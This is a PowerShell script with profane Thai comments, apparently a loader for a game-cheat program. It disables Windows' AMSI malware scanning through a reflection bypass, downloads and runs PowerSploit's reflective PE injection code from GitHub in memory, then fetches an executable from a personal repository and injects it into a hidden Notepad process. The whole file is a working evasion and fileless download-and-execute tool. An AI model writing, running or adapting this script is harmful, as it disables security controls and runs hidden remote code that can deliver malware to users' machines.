# ปิด AMSI 
Write-Host "[*] กำลังกระทืบ AMSI..." -ForegroundColor Yellow
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);

# โหลด Injector ของ PowerSploit แบบ Fileless
Write-Host "[*] ดึงโค้ด Reflective Injector จาก GitHub..." -ForegroundColor Yellow
$injUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString($injUrl)

# ดาวน์โหลด loder.exe ของมึงจาก GitHub ลง Memory
Write-Host "[*] กำลังโหลด loder.exe จาก GitHub ของมึง..." -ForegroundColor Yellow
$exeUrl = "https://raw.githubusercontent.com/077x1/loader/main/loder.exe" 
$WebClient = New-Object System.Net.WebClient
try {
    $PEBytes = $WebClient.DownloadData($exeUrl)
    Write-Host "[+] โหลดสำเร็จ! ขนาดไฟล์: $($PEBytes.Length) ไบต์" -ForegroundColor Green
} catch {
    Write-Host "[-] เชี่ย! โหลดไม่ผ่าน มึงลองเช็คว่าตั้ง repo เป็น Public รึยัง หรือไฟล์ชื่อ loder.exe พิมพ์ถูกไหม" -ForegroundColor Red
    exit
}

# เสก Notepad (ร่างทรง) ขึ้นมาบังหน้า
Write-Host "[*] กำลังเสกร่างทรง (Notepad)..."
$targetProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
if (-not $targetProc) {
    Start-Process -FilePath "notepad.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 1
    $targetProc = Get-Process -Name "notepad" | Select-Object -First 1
}

# ยัดโค้ดทะลวงไส้เข้า Notepad!
Write-Host "[*] ยิง Payload เข้า PID: $($targetProc.Id) ..." -ForegroundColor Cyan
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcessId $targetProc.Id

Write-Host "[+] เปรี้ยง! สิงร่างสำเร็จ UI โกงเกมมึงต้องเด้งขึ้นมาแล้วไอ้สัส!" -ForegroundColor Green
